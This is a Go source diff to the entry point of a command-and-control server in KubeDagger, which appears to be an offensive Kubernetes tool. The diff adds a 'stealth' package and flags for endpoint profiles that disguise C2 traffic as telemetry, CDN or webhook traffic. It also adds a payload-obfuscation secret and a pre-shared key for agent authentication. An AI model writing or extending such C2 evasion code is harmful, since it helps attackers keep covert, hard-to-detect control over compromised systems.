@@ -8,6 +8,7 @@ import (
 	"syscall"
 
 	"github.com/sirupsen/logrus"
+	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
 	"github.com/yasindce1998/KubeDagger/pkg/c2server"
 	"github.com/yasindce1998/KubeDagger/pkg/kubedagger/c2"
 )
@@ -22,6 +23,11 @@ func main() {
 		tlsKey     = flag.String("key-file", "", "path to server key PEM")
 		plaintext  = flag.Bool("plaintext", false, "disable TLS (development only)")
 		logLevel   = flag.String("log-level", "info", "log level (debug, info, warn, error)")
+		profile    = flag.String("profile", "legacy", "endpoint profile: legacy, telemetry, cdn, webhook")
+		rateLimit  = flag.Float64("rate-limit", 0, "requests per second per IP (0 = disabled)")
+		rateBurst  = flag.Int("rate-burst", 0, "rate limit burst (default: 2x rate-limit)")
+		obfuscKey  = flag.String("obfusc-key", "", "shared secret for payload obfuscation")
+		psk        = flag.String("psk", "", "pre-shared key for agent auth (X-Api-Key)")
 	)
 	flag.Parse()
 
@@ -31,8 +37,14 @@ func main() {
 	}
 	logrus.SetLevel(level)
 
-	var cfg c2server.ServerConfig
-	cfg.ListenAddr = *listenAddr
+	cfg := c2server.ServerConfig{
+		ListenAddr: *listenAddr,
+		Endpoints:  stealth.GetProfile(*profile),
+		RateLimit:  *rateLimit,
+		RateBurst:  *rateBurst,
+		ObfuscKey:  *obfuscKey,
+		PSK:        *psk,
+	}
 
 	if !*plaintext {
 		tlsCfg, caPEM, err := setupTLS(*tlsCA, *tlsCert, *tlsKey, *listenAddr)
